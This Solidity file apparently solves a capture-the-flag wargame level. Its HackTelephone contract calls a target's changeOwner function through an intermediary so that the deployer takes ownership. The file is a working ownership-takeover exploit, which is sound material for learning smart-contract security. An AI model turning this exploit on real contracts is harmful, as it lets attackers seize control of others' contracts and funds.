// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address) external;
}

contract HackTelephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address telephone) public {
    ITelephone(telephone).changeOwner(owner);
  }
}